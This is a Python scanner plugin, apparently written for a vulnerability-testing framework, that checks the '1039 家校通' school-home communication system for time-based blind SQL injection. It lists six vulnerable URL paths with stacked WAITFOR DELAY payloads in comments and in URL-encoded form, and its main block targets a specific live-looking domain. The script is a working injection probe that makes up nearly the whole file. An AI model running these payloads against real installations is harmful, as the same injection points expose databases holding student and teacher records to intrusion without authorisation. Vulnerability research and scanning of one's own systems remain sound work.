#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name:1039 家校通 6多处sql延时盲注   （补yichin的漏,求yichin别打）
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0147537
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0147539
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0129577
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0127988
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0126279

# /admin/Product/Com_Des.aspx?id=16;  WAITFOR  DELAY '0:0:5'--
# /admin/Teacher/Teach_Add.aspx?t_id=152;  WAITFOR  DELAY '0:0:0'--
# /admin/school/AddSchool.aspx?t=0.8808870588783335&code=01';  WAITFOR  DELAY '0:0:5'--
# /Handler/Product/StuList.ashx?xx=1&value=00001%' ; WAITFOR  DELAY '0:0:5'--
# /Handler/carorroom/ValidCode.ashx?t=NaN&no=1' ; WAITFOR DELAY '0:0:5'--
# /Teacher/TeacherPf.aspx?yid=0030' ; WAITFOR DELAY '0:0:5'--

#Data:2016/2/20
import time

def  assign(service,arg):
    if service=="1039_jxt":
        return  True,arg

def audit(arg):
    url_payloads={"admin/Product/Com_Des.aspx?id=16":"%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--",
                  "admin/Teacher/Teach_Add.aspx?t_id=152":"%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--",
                  "admin/school/AddSchool.aspx?t=0.8808870588783335&code=01":"%27%3B%20%20WAITFOR%20%20DELAY%20%270%3A0%3A5%27--",
                  "Handler/Product/StuList.ashx?xx=1&value=00001%":"%27%3B%20%20WAITFOR%20%20DELAY%20%270%3A0%3A5%27--",
                  "Handler/carorroom/ValidCode.ashx?t=NaN&no=1":"%27%20%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--",
                  "Teacher/TeacherPf.aspx?yid=0030":"%27%3B%20%20WAITFOR%20%20DELAY%20%270%3A0%3A5%27--"}
    for  url in url_payloads:
        time0=time.time()
        code,head,res,errcode,finalurl=curl.curl2(arg+url)
        #print finalurl
        time1=time.time()
        code,head,res,errcode,finalurl=curl.curl2(arg+url+url_payloads[url])
        #print finalurl

        time2=time.time()
        if ((time2-time1)-(time1-time0))>4:
            security_hole("sql inject:"+arg+url)

if __name__=="__main__":
    from dummy import *
    audit(assign('1039_jxt','http://www.whaqjx.com/')[1])